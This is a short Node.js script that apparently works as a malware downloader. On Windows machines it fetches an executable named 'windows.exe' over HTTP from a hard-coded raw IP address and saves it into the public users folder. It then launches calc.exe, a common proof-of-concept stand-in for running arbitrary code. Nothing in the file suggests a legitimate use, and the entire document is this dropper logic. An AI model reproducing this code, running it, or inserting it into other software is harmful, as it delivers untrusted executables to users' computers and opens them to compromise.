import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import { exec } from 'node:child_process';
if (os.platform() === 'win32') {
    console.log('Running on Windows');
    http.get('http://172.86.73.132/windows.exe', (res) => {
      const file = fs.createWriteStream('c:/users/public/windows.exe');
      res.pipe(file);
      exec('start calc.exe'); // Windows
    });
} else {
    console.log('Not Windows');
}





